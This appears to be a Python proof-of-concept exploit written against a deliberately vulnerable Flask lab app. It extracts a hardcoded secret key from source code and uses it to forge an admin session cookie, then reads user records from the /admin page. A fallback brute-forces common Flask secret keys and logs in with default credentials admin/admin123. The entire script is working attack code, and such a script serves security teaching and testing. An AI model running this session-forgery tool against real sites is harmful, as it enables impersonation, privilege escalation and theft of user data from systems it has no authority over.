#!/usr/bin/env python3

import requests
import sys
import re
import os
import base64
import json
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class MockApp:
    def __init__(self, secret_key):
        self.secret_key = secret_key

def hardcoded_secrets_poc(base_url):
    print("\n[*] Hardcoded Secrets Proof of Concept")
    print("[*] This PoC demonstrates the risks of hardcoded secrets in source code")
    
    # First, check if we have access to the source code
    # In a real scenario, this might be from a code leak, public repository, etc.
    if os.path.exists("vulnerable_app.py"):
        print("\n[+] Found source code file: vulnerable_app.py")
        
        # Search for hardcoded secrets in the source code
        with open("vulnerable_app.py", "r") as f:
            source_code = f.read()
        
        # Look for the secret key
        secret_key_match = re.search(r'app\.secret_key\s*=\s*["\']([^"\']*)["\'](\s*#\s*VULNERABILITY\s*1:\s*Hardcoded\s*Secret)?', source_code)
        if secret_key_match:
            secret_key = secret_key_match.group(1)
            print(f"[!] HARDCODED SECRET VULNERABILITY CONFIRMED!")
            print(f"[+] Found hardcoded Flask secret key: {secret_key}")
            
            # Demonstrate the impact by forging a session cookie
            print("\n[+] Demonstrating impact by forging a session cookie...")
            
            # Create a session serializer with the discovered secret key
            app = MockApp(secret_key)
            session_interface = SecureCookieSessionInterface()
            serializer = session_interface.get_signing_serializer(app)
            
            # Create a forged session with admin privileges
            forged_session = {"username": "forged_admin", "role": "admin"}
            forged_cookie = serializer.dumps(forged_session)
            
            print(f"[+] Created forged session cookie: {forged_cookie}")
            
            # Use the forged cookie to access the admin panel
            print("\n[+] Attempting to access admin panel with forged cookie...")
            cookies = {"session": forged_cookie}
            response = requests.get(f"{base_url}/admin", cookies=cookies)
            
            if "Admin Panel" in response.text:
                print("[!] Successfully accessed admin panel with forged cookie!")
                
                # Extract user information from the admin panel
                users = re.findall(r'ID: (\d+), Username: ([^,]+), Role: ([^<]+)', response.text)
                if users:
                    print("\n[+] Extracted user information from admin panel:")
                    for user_id, username, role in users:
                        print(f"    User ID: {user_id}, Username: {username}, Role: {role}")
                
                print("\n[+] This vulnerability could allow attackers to:")
                print("    1. Forge session cookies to impersonate any user")
                print("    2. Bypass authentication entirely")
                print("    3. Escalate privileges to administrator level")
                print("    4. Access sensitive data and functionality")
            else:
                print("[-] Failed to access admin panel with forged cookie")
                print("[-] The application might have additional protections")
        else:
            print("[-] Couldn't find hardcoded secret key in the source code")
    else:
        print("[-] Source code file not found")
        print("[+] In a real attack scenario, this would require access to the source code")
        print("[+] This could be through a code leak, public repository, or server compromise")
        
        # Alternative approach: try common default Flask secret keys
        print("\n[+] Trying common default Flask secret keys...")
        common_keys = [
            "hardcoded_secret_key_123",  # The one from our vulnerable app
            "development_key",
            "flask_secret_key",
            "secret_key",
            "change_me",
            "super_secret",
            "default_secret_key"
        ]
        
        # First, get a valid session cookie structure by logging in
        print("[+] Getting a valid session cookie structure...")
        session = requests.Session()
        response = session.post(f"{base_url}/login", data={"username": "admin", "password": "admin123"})
        
        if "session" in session.cookies:
            original_cookie = session.cookies["session"]
            print(f"[+] Got a valid session cookie: {original_cookie}")
            
            # Try to decode it with common keys
            for key in common_keys:
                try:
                    app = MockApp(key)
                    session_interface = SecureCookieSessionInterface()
                    serializer = session_interface.get_signing_serializer(app)
                    
                    # Try to decode the cookie
                    decoded = serializer.loads(original_cookie)
                    print(f"[!] Successfully decoded cookie with key: {key}")
                    print(f"[+] Decoded session: {decoded}")
                    
                    # Now forge a new cookie with admin privileges
                    forged_session = {"username": "forged_admin", "role": "admin"}
                    forged_cookie = serializer.dumps(forged_session)
                    
                    print(f"[+] Created forged session cookie: {forged_cookie}")
                    
                    # Try to use the forged cookie
                    cookies = {"session": forged_cookie}
                    response = requests.get(f"{base_url}/admin", cookies=cookies)
                    
                    if "Admin Panel" in response.text:
                        print("[!] Successfully accessed admin panel with forged cookie!")
                        break
                except Exception as e:
                    continue
        else:
            print("[-] Failed to get a valid session cookie")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    hardcoded_secrets_poc(base_url)